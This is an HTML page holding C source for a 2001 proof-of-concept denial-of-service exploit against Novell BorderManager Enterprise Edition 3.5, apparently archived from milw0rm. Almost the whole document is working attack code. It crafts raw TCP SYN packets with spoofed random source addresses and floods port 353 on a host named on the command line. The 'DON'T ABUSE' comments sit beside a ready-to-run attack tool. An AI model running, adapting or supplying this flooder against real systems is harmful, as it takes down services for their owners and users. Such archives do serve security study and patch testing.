<html><head><title>Novell BorderManager Enterprise Edition 3.5 Denial of Service Exploit</title></head><pre>/* 29.4.2001 honoriak@mail.ru
   Proof of concept DoS Novell BorderManager Enterprise Edition 3.5
   helisec
   DoSs are lame, i know, but boredom is ugly. DON'T ABUSE.
   greets: jimjones, doing, darkcode for his paper about raw sockets 
   and all helisec guys.
*/

#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;time.h&gt;  
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt; 
#include &lt;sys/socket.h&gt;
#include &lt;netdb.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;netinet/ip.h&gt;

#define __FAVOR_BSD
#include &lt;netinet/tcp.h&gt;

#define PORT 353 

 /* to be easier the processing, this struct :) */
 
 struct pseudohdr {
         struct in_addr saddr;
         struct in_addr daddr;
         u_char zero;
         u_char protocol;
         u_short len;
         struct tcphdr tcpheader;
     }pseudoh;
                                    

unsigned long resolve(name)  
	char *name;
 {

struct in_addr h2;
struct hostent *hname;

if (!(hname = gethostbyname(name))) return(0);
memcpy((char *)&amp;h2.s_addr, hname-&gt;h_addr, hname-&gt;h_length);
return(h2.s_addr);
}
               
 /* checksum ripped and modified by me */
 
u_short
checksum (data, length)
	u_short *data;
	u_short length;
{

register long value;
u_short i;
    
      for (i = 0; i &lt; (length &gt;&gt; 1); i++)
       value += data[i];
          
       if ((length &amp; 1) == 1)
       value += (data[i] &lt;&lt; 8);
                
       value = (value &amp; 65535) + (value &gt;&gt; 16);
                  
       return (~value);
}
                    

void packet(vic, socket) 
	struct sockaddr_in *vic;
	int socket;
 {
 
 int count;
 char buf[40];
                     
 struct ip *ipheader = (struct ip *)buf;
 struct tcphdr *tcpheader = (struct tcphdr *)(buf + sizeof(struct ip));
 
 bzero (&amp;buf, (sizeof(struct ip) + sizeof(struct tcphdr)) );
 
 	/* filling ip struct */
 	
 	ipheader-&gt;ip_v = IPVERSION;
 	ipheader-&gt;ip_hl = 5;
 	ipheader-&gt;ip_tos = htons(0);
 	ipheader-&gt;ip_len = htons(sizeof(buf));
 	ipheader-&gt;ip_id = rand() % 0xffff;
 	ipheader-&gt;ip_off = htons(0);
 	ipheader-&gt;ip_ttl = 0xff;  /* 255 hex */
 	ipheader-&gt;ip_p = IPPROTO_TCP;
 	ipheader-&gt;ip_src.s_addr = rand();
 	ipheader-&gt;ip_dst.s_addr = vic-&gt;sin_addr.s_addr;
 	ipheader-&gt;ip_sum = 0;
 	
 	/* filling tcphdr struct */
 	
 	tcpheader-&gt;th_sport = 2424; /* random */
 	tcpheader-&gt;th_dport = vic-&gt;sin_port;
 	tcpheader-&gt;th_seq = htonl(0xF1C); /* random */
 	tcpheader-&gt;th_ack = 0;
 	tcpheader-&gt;th_off = 5;
 	tcpheader-&gt;th_flags = TH_SYN; /* the important flag */
 	tcpheader-&gt;th_win = 4096;
 	tcpheader-&gt;th_sum = 0;   
 	

 bzero (&amp;pseudoh, 12 + sizeof(struct tcphdr));
 pseudoh.saddr.s_addr = rand();
 pseudoh.daddr.s_addr = vic-&gt;sin_addr.s_addr;
 pseudoh.protocol = 6;
 pseudoh.len = htons (sizeof(struct tcphdr));
 memcpy((char *)&amp;pseudoh.tcpheader, (char *)tcpheader, sizeof (struct tcphdr));
 tcpheader-&gt;th_sum = checksum((u_short *)&amp;pseudoh, 12 + sizeof (struct tcphdr));
  
 /* sending packets, DON'T ABUSE! */

for (count = 0; count &lt; 260; count++) {
  if ( (sendto(socket, 
 	   buf, 
 	   (sizeof(struct iphdr) + sizeof(struct tcphdr)), 
 	   0, 
 	   (struct sockaddr *)vic, 
 	   sizeof(struct sockaddr_in))) &lt; 0) {
 	   fprintf(stderr, &quot;Error sending packets\n&quot;); 
           exit(-1);
           }              
      }                              	                                                    
close (socket);
  }
 
void usage(proggy) 
	char *proggy;
 {
	fprintf(stderr,&quot;DoS a Novell BorderManager Enterprise Edition 3.5\n&quot;);
	fprintf(stderr, &quot;honoriak@mail.ru from helisec\n&quot;);
	fprintf(stderr, &quot;Usage: %s host\n&quot;, proggy);
	exit(0);
	}

main(argc, argv) 
	int argc;
	char *argv[];
	
 {
  
  struct sockaddr_in h;
  int s0ck, uno = 1;
  
  if (argc &lt; 2)
  	{
  	usage(argv[0]);
  	}
  	
  bzero(&amp;h, sizeof(h)); 
  h.sin_family = AF_INET;   
  h.sin_port = htons(PORT); 

if ( (inet_pton(AF_INET, argv[1], &amp;h.sin_addr)) &lt;= 0)
	{
	h.sin_addr.s_addr = resolve(argv[1]);
	}
	
if (!h.sin_addr.s_addr) {
	fprintf(stderr, &quot;Error resolving host\n&quot;);
	exit(-1);
	}
	
if ((s0ck = socket(AF_INET, SOCK_RAW, 255)) &lt; 0) {
        fprintf(stderr, &quot;Error creating raw socket, root is needed\n&quot;);
        exit (-1);
        }

setsockopt(s0ck, SOL_SOCKET, SO_BROADCAST, &amp;uno, sizeof(uno));

packet(&amp;h, s0ck);
fprintf(stderr, &quot;DoS completed.\n&quot;);
exit(0);
}


// milw0rm.com [2001-05-07]</pre></html>